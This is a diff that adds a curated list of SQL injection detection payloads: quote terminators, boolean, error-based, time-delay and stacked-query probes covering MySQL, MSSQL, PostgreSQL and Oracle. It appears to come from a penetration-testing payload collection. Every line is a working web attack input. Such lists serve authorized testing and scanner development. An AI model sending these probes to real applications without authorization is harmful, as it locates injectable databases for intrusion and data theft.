@@ -1,0 +1,49 @@
+# ─────────────────────────────────────────────
+# DETECTION PAYLOADS — universal SQLi probes
+# Run these first regardless of DB or technique
+# Source: PortSwigger, manual curation
+# ─────────────────────────────────────────────
+
+# --- Basic string terminators ---
+'
+''
+`
+')
+'))
+'--
+'-- -
+'#
+"
+"--
+"-- -
+"#
+
+# --- Boolean probes (check if response changes) ---
+' AND '1'='1
+' AND '1'='2
+' OR '1'='1
+' OR '1'='2
+1 AND 1=1
+1 AND 1=2
+1' AND 1=1--
+1' AND 1=2--
+
+# --- Error triggers (generic) ---
+'||'
+'+'
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--
+' AND 1=CONVERT(int,@@version)--
+' AND 1=(SELECT 1 FROM DUAL WHERE 1=1)--
+
+# --- Time probes (generic, short delay) ---
+' AND SLEEP(3)--
+' AND SLEEP(3)='
+'; WAITFOR DELAY '0:0:3'--
+' OR PG_SLEEP(3)--
+' AND 1=(SELECT 1 FROM (SELECT SLEEP(3))a)--
+'||(SELECT DBMS_PIPE.RECEIVE_MESSAGE(CHR(65)||CHR(65)||CHR(65),3) FROM DUAL)||'
+
+# --- Stacked query probes ---
+'; SELECT 1--
+'; SELECT SLEEP(3)--
+'; WAITFOR DELAY '0:0:3'; --
